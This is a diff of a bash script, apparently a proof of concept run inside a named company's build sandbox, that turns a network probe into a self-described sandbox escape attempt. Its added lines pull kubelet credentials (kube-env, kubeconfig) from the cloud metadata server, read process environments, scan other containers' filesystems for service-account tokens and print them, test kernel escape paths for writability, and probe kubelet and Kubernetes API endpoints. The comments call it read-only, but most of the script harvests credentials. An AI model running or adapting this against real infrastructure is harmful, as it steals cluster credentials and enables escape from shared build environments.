@@ -1,39 +1,49 @@
 #!/usr/bin/env bash
-# Internal network position from inside the Yext build sandbox.
-# READ-ONLY, targeted (no port sweep, no mutating calls, short timeouts).
+# Sandbox escape ATTEMPT. Read-only probes only; no sysctl/cgroup writes, no kernel exploits.
 set +e
 B="YEXTPOC7731"; echo "$B-BEGIN"
+MD=http://169.254.169.254/computeMetadata/v1
+H='Metadata-Flavor: Google'
 
-echo "$B === 1. NETWORK CONTEXT ==="
-cat /etc/resolv.conf 2>&1
-ip -4 addr 2>/dev/null | grep -E 'inet ' || hostname -i 2>&1
-ip route 2>/dev/null | head -5
-
-echo "$B === 2. CLUSTER DNS RESOLUTION ==="
-for N in kubernetes.default.svc.cluster.local kubernetes.default \
-         kube-dns.kube-system.svc.cluster.local metadata.google.internal; do
-  printf '%-48s ' "$N"
-  getent hosts "$N" 2>&1 | head -1 || echo "(no resolve)"
+echo "$B === A. GKE NODE METADATA ATTRIBUTES (kube-env = kubelet creds) ==="
+echo "--- attribute index ---"
+curl -s -m 8 -H "$H" "$MD/instance/attributes/" 2>&1 | head -40
+for A in kube-env kubeconfig cluster-name cluster-location cluster-uid \
+         kubelet-config instance-template created-by; do
+  echo "--- attributes/$A ---"
+  curl -s -m 8 -H "$H" "$MD/instance/attributes/$A" 2>&1 | head -c 700; echo
 done
 
-echo "$B === 3. KUBERNETES API REACHABLE / ANONYMOUS? ==="
-for U in https://kubernetes.default.svc/version \
-         https://kubernetes.default.svc/api \
-         https://10.0.0.1/version; do
-  printf '%-44s ' "$U"
-  curl -sk -m 8 -o - -w ' [HTTP %{http_code}]' "$U" 2>&1 | tr -d '\n' | head -c 220; echo
+echo "$B === B. PID NAMESPACE LEAKAGE ==="
+echo "pid count: $(ls -d /proc/[0-9]* 2>/dev/null | wc -l)"
+ls -d /proc/[0-9]* 2>/dev/null | head -20
+echo "--- /proc/1 ---"
+cat /proc/1/cmdline 2>&1 | tr '\0' ' '; echo
+cat /proc/1/environ 2>&1 | tr '\0' '\n' | head -10
+echo "--- can we read ANY other container's SA token via /proc/<pid>/root ? ---"
+for P in $(ls -d /proc/[0-9]* 2>/dev/null | head -40); do
+  T="$P/root/var/run/secrets/kubernetes.io/serviceaccount/token"
+  [ -r "$T" ] && { echo "READABLE: $T"; head -c 120 "$T"; echo; }
 done
+echo "(end of /proc scan)"
 
-echo "$B === 4. KUBELET ON THE NODE (anonymous read?) ==="
-NODE_IP=$(ip route 2>/dev/null | awk '/default/{print $3; exit}')
-echo "gateway/node-ip guess = $NODE_IP"
-for P in 10250 10255; do
-  printf 'kubelet %s:%s  ' "$NODE_IP" "$P"
-  curl -sk -m 6 -o - -w ' [HTTP %{http_code}]' "https://$NODE_IP:$P/pods" 2>&1 | tr -d '\n' | head -c 200; echo
+echo "$B === C. MOUNTINFO (host paths) + WRITABILITY ==="
+cat /proc/self/mountinfo 2>&1 | head -25
+echo "--- /proc/sys and /sys write test (stat only, no write) ---"
+for F in /proc/sys/kernel/core_pattern /proc/sysrq-trigger /sys/kernel/uevent_helper; do
+  printf '%-40s ' "$F"; [ -w "$F" ] && echo "WRITABLE" || echo "not writable"
 done
+mount 2>&1 | grep -E 'ro,|rw,' | grep -E '/proc|/sys' | head -6
 
-echo "$B === 5. EGRESS: can we even reach the public internet? (control) ==="
-printf 'example.com  '; curl -s -m 8 -o /dev/null -w '[HTTP %{http_code}]\n' https://example.com 2>&1
-printf 'github.com   '; curl -s -m 8 -o /dev/null -w '[HTTP %{http_code}]\n' https://github.com 2>&1
+echo "$B === D. KUBELET / K8S API FROM THE NODE ==="
+GW=$(ip route 2>/dev/null | awk '/default/{print $3; exit}')
+SELF=$(hostname -i 2>/dev/null)
+echo "gateway=$GW self=$SELF"
+for T in "$GW:10255/pods" "$GW:10250/pods" "$GW:10250/runningpods/"; do
+  printf 'http(s)://%-26s ' "$T"
+  curl -sk -m 6 -o - -w ' [HTTP %{http_code}]' "https://$T" 2>&1 | tr -d '\n' | head -c 160; echo
+done
+printf 'k8s api kubernetes.default   '
+curl -sk -m 6 -o - -w ' [HTTP %{http_code}]' https://kubernetes.default.svc/version 2>&1 | tr -d '\n' | head -c 160; echo
 
 echo "$B-END"; exit 0
